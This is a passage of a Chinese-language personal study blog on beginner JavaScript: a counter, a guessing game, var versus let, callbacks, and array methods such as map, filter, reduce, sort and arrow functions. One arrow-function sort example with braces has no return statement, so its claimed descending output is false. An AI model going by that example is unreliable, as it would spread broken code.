+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">id</span>=<span class="string">&quot;mylabel&quot;</span>&gt;</span>0<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;dec&quot;</span>&gt;</span>减1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;res&quot;</span>&gt;</span>重置<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;inc&quot;</span>&gt;</span>加1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>js</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> count=<span class="number">0</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dec&quot;</span>).<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">     count-=<span class="number">1</span>;</span><br><span class="line">     <span class="comment">//count--;</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mylabel&quot;</span>).<span class="property">innerHTML</span>=count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;res&quot;</span>).<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mylabel&quot;</span>).<span class="property">innerHTML</span>=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;inc&quot;</span>).<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    count+=<span class="number">1</span>;</span><br><span class="line">   <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mylabel&quot;</span>).<span class="property">innerHTML</span>=count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>css</p>
+<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#mylabel</span>&#123;</span><br><span class="line">    <span class="attribute">display</span>:block;</span><br><span class="line">    <span class="attribute">text-align</span>:center;</span><br><span class="line">    <span class="attribute">font-size</span>:<span class="number">50px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="9-杂项"><a href="#9-杂项" class="headerlink" title="9.杂项"></a>9.杂项</h2><p><strong>随机数生成</strong></p>
+<p><strong>截取</strong></p>
+<p>它是自带的slice()，用法同substr</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">user=<span class="string">&quot;hello!yu&quot;</span>;</span><br><span class="line"><span class="comment">//user=user.slice(4);// o!yu</span></span><br><span class="line"><span class="comment">//user=user.slice(2,4);//ll 左闭右开</span></span><br><span class="line"><span class="comment">//user=user.slice(0,user.indexOf(&quot;y&quot;));//hello!</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user);</span><br></pre></td></tr></table></figure>
+
+<p><strong>if else&#x2F;and,or,not&#x2F;while,for,嵌套for&#x2F;break,continue</strong></p>
+<p>略</p>
+<p><strong>函数</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">start</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> p1=<span class="string">&quot;sada&quot;</span>;</span><br><span class="line">    <span class="keyword">let</span> p2=<span class="string">&quot;12312&quot;</span>;</span><br><span class="line">    <span class="title function_">func2</span>(p1,p2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">func2</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;It&#x27;s &quot;</span>+a);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;It&#x27;s &quot;</span>+b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>return 也是可以的</p>
+<p><strong>三元符</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> num=<span class="title function_">check</span>(<span class="number">15</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">n</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> n&gt;<span class="number">20</span>?<span class="string">&quot;yes&quot;</span>:<span class="string">&quot;no&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>var与let</strong></p>
+<p>1.let 限制在 **{}**里；而var用在一个函数格式 <strong>func(){}</strong> 里，</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">1</span>;i&lt;=<span class="number">3</span>;i++)&#123; <span class="comment">//i没有定义</span></span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(i);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;=<span class="number">3</span>;i++)&#123; <span class="comment">//i=4</span></span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(i);</span><br></pre></td></tr></table></figure>
+
+<p>但是如果值在函数中声明了，函数外需要使用时，需要将这个指 <strong>全局定义</strong></p>
+<p>2.用<strong>var</strong>定义全局时，会在浏览器的window属性找到</p>
+<p>而<strong>let</strong>定义的找不到，或者说，它改不了</p>
+<p><strong>反引号与参数-嵌入文本吧</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name=<span class="string">&quot;b2323&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello, &quot;</span>,name);<span class="comment">//hello,  b2323</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`hello <span class="subst">$&#123;name&#125;</span>`</span>);<span class="comment">//hello b2323</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>形式处理</strong></p>
+<p>比如保留多少位，字符串格式什么的</p>
+<h3 id="猜字游戏"><a href="#猜字游戏" class="headerlink" title="猜字游戏"></a>猜字游戏</h3><p>html</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">id</span>=<span class="string">&quot;mylabel&quot;</span>&gt;</span>Guess the num 1-10<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;myinput&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;mybutton&quot;</span>&gt;</span>提交了<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>js</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> num=<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>()*<span class="number">10</span>+<span class="number">1</span>);<span class="comment">//1-10</span></span><br><span class="line"><span class="keyword">let</span> guesscount=<span class="number">0</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mybutton&quot;</span>).<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> guess=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myinput&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    guesscount+=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(guess==num)&#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">`<span class="subst">$&#123;num&#125;</span> is the #. It took your <span class="subst">$&#123;guesscount&#125;</span> times!`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(guess&lt;num)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;too small&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&quot;too large&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>单选</strong></p>
+<p>html</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">label</span> <span class="attr">id</span>=<span class="string">&quot;mylabel&quot;</span>&gt;</span>选择一个颜色<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;r1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;unit&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">label</span>&gt;</span>blue<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">id</span>=<span class="string">&quot;r2&quot;</span> <span class="attr">name</span>=<span class="string">&quot;unit&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">label</span>&gt;</span>red<span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;mybutton&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">label</span> <span class="attr">id</span>=<span class="string">&quot;templabel&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>js</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mybutton&quot;</span>).<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> res=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;templabel&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;r1&quot;</span>).<span class="property">checked</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        res.<span class="property">innerHTML</span>=<span class="string">&quot;你选了蓝色&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;r2&quot;</span>).<span class="property">checked</span>)&#123;</span><br><span class="line">        res.<span class="property">innerHTML</span>=<span class="string">&quot;你选了红的&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        res.<span class="property">innerHTML</span>=<span class="string">&quot;选一个吧&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>数组</strong></p>
+<p>略，用到的时候再补</p>
+<p><strong>排序sort</strong></p>
+<p><strong>二维数组遍历</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> p1=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">let</span> p2=[<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> p=[p1,p2];</span><br><span class="line">p[<span class="number">0</span>][<span class="number">1</span>]=<span class="string">&quot;asd&quot;</span>; <span class="comment">//替换了b</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> list <span class="keyword">of</span> p)&#123;<span class="comment">//行</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> zm <span class="keyword">of</span> list)&#123;<span class="comment">//列</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(zm);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>展开运算符</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> p1=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">let</span> p2=[<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//p1.push(p2);//会压缩p2内容  [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, Array(3)]</span></span><br><span class="line">p1.<span class="title function_">push</span>(...p2);<span class="comment">//[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p1);</span><br></pre></td></tr></table></figure>
+
+<p><strong>剩余参数</strong></p>
+<p>解决参数拿不准的情况</p>
+<p>比如一个函数是加和参数，但是不清楚参数个数</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//剩余参数</span></span><br><span class="line"><span class="keyword">let</span> a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>,d=<span class="number">4</span>,e=<span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">sum</span>(a,b,c,d,e));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">...nums</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> total=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> num <span class="keyword">of</span> nums)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`this is <span class="subst">$&#123;num&#125;</span>`</span>)</span><br><span class="line">        total+=num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>callback</strong></p>
+<p>将 <strong>函数本身</strong> 作为一个参数传递给另一个函数</p>
+<p>如果这样传，比较麻烦</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> out=<span class="title function_">sum</span>(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(out);</span><br><span class="line"><span class="title function_">passval</span>(out);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">passval</span>(<span class="params">n</span>)&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;templabel&quot;</span>).<span class="property">innerHTML</span>=n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//改进后，</span></span><br><span class="line"><span class="title function_">sum</span>(<span class="number">2</span>,<span class="number">3</span>,passval);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sum</span>(<span class="params">x,y,callback</span>)&#123;</span><br><span class="line">    <span class="title function_">callback</span>(x+y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">passval</span>(<span class="params">n</span>)&#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;templabel&quot;</span>).<span class="property">innerHTML</span>=n;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>array.forEach()</strong></p>
+<p>对数组<strong>元素</strong>进行操作</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">array.<span class="title function_">forEach</span>(<span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">currentValue, index, array</span>)&#123;</span><br><span class="line">  <span class="comment">//处理逻辑</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/*currentValue代表当前遍历到的元素，index代表当前元素的索引，array代表数组本身*/</span></span><br></pre></td></tr></table></figure>
+
+<p>例子：让每个元素首字母大写</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr=[<span class="string">&quot;aliba&quot;</span>,<span class="string">&quot;niude&quot;</span>,<span class="string">&quot;hah&quot;</span>];</span><br><span class="line">arr.<span class="title function_">forEach</span>(daxie);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">daxie</span>(<span class="params">element,index,array</span>)&#123;</span><br><span class="line">    <span class="comment">// array[index]，数组的第index个元素</span></span><br><span class="line">    array[index]=element[<span class="number">0</span>].<span class="title function_">toUpperCase</span>()+element.<span class="title function_">substring</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">//substring(1)从字符串的第一个字符开始截取到完</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr);<span class="comment">//[&#x27;Aliba&#x27;, &#x27;Niude&#x27;, &#x27;Hah&#x27;]</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>array.map()</strong></p>
+<p>返回一个新数组，数组中的元素为原始数组元素调用函数处理后的值</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">array.<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">currentValue,index,arr</span>), thisValue)</span><br><span class="line">thisValue可选</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> shuzi=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"><span class="keyword">let</span> squres=shuzi.<span class="title function_">map</span>(squre);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(squres);<span class="comment">//输出数组 [1, 4, 9, 16, 25]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">squre</span>(<span class="params">element</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">pow</span>(element,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">squres.<span class="title function_">forEach</span>(print);<span class="comment">//输出单个元素</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">print</span>(<span class="params">element</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(element);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>array.filter()</strong></p>
+<p>创建一个新的数组，新数组中的元素是通过检查指定数组中符合条件的所有元素，没有符合的就空数组</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">array.<span class="title function_">filter</span>(<span class="keyword">function</span>(<span class="params">currentValue,index,arr</span>), thisValue)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> age=[<span class="number">18</span>,<span class="number">19</span>,<span class="number">25</span>,<span class="number">30</span>,<span class="number">45</span>,<span class="number">16</span>];</span><br><span class="line"><span class="keyword">let</span> ages=age.<span class="title function_">filter</span>(show);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ages);<span class="comment">//[25, 30, 45]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">show</span>(<span class="params">element</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(element&gt;<span class="number">20</span>) <span class="keyword">return</span> element;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>array.reduce</strong></p>
+<p>将数组成一个单值</p>
+<p>例子，加和为单值</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> list=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> lists=list.<span class="title function_">reduce</span>(check);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(lists);<span class="comment">//55</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">total,element</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> total+element;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>数组排序</strong></p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> nums=[<span class="number">1</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">11</span>];</span><br><span class="line"></span><br><span class="line">nums=nums.<span class="title function_">sort</span>(jiangxu);<span class="comment">//[11, 7, 6, 5, 3, 1]</span></span><br><span class="line">nums=nums.<span class="title function_">sort</span>(shengxu);<span class="comment">//[1, 3, 5, 6, 7, 11]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nums);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">jiangxu</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> y-x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shengxu</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> x-y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>函数表达式(匿名函数)</strong></p>
+<p>就是指计数时的这种方式</p>
+<p>没必要给函数创建唯一的名称，或者说是省略了造名字的过程</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;dec&quot;</span>).<span class="property">onclick</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">     count-=<span class="number">1</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;mylabel&quot;</span>).<span class="property">innerHTML</span>=count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//而不是</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*dasda();</span></span><br><span class="line"><span class="comment">function dasda()&#123;</span></span><br><span class="line"><span class="comment">.......</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>箭头函数(Lambda 函数)</strong></p>
+<p>或者说紧凑函数，去掉了function，用**&#x3D;&gt;{}**</p>
+<p>语句只有一句，可以省略**{}**</p>
+<p>例1，无参或一个参数</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这是传统的函数表达式</span></span><br><span class="line"><span class="keyword">const</span> greeting=<span class="keyword">function</span>(<span class="params">user</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`1232, is <span class="subst">$&#123;user&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">greeting</span>(<span class="string">&quot;bro&quot;</span>);<span class="comment">//1232, is bro</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//箭头函数呢</span></span><br><span class="line"> <span class="keyword">const</span> <span class="title function_">greeting</span>=(<span class="params">user</span>)=&gt;<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`1232, is <span class="subst">$&#123;user&#125;</span>`</span>);</span><br><span class="line"><span class="title function_">greeting</span>(<span class="string">&quot;bro&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>例2-两个参数</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//传统</span></span><br><span class="line"><span class="keyword">const</span> func2=<span class="keyword">function</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> x+y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">func2</span>(<span class="number">5</span>,<span class="number">8</span>));<span class="comment">//13</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//箭头</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">func2</span>=(<span class="params">x,y</span>)=&gt;x+y;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">func2</span>(<span class="number">5</span>,<span class="number">8</span>));<span class="comment">//13</span></span><br></pre></td></tr></table></figure>
+
+<p>例3-排序</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">let</span> nums=[<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">nums= nums.<span class="title function_">sort</span>(des);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nums);<span class="comment">//[9, 7, 6, 4, 3, 2, 1]</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">des</span>(<span class="params">x,y</span>)&#123;<span class="comment">//倒序</span></span><br><span class="line">    <span class="keyword">return</span> y-x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nums.<span class="title function_">forEach</span>(print);<span class="comment">//单个打印</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">print</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//传统</span></span><br><span class="line"><span class="keyword">let</span> nums=[<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">nums= nums.<span class="title function_">sort</span>(<span class="keyword">function</span>(<span class="params">x,y</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> y-x;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nums);<span class="comment">//[9, 7, 6, 4, 3, 2, 1]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nums.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">&#125;);<span class="comment">//单个打印</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//=&gt;</span></span><br><span class="line"><span class="keyword">let</span> nums=[<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">nums= nums.<span class="title function_">sort</span>(<span class="function">(<span class="params">x,y</span>)=&gt;</span>&#123;y-x;&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(nums);<span class="comment">//[9, 7, 6, 4, 3, 2, 1]</span></span><br><span class="line"></span><br><span class="line">nums.<span class="title function_">forEach</span>(<span class="function">(<span class="params">e</span>)=&gt;</span>&#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(e);&#125;);<span class="comment">//单个打印</span></span><br><span class="line"><span class="comment">//花括号可以去掉</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>打乱数组</strong></p>
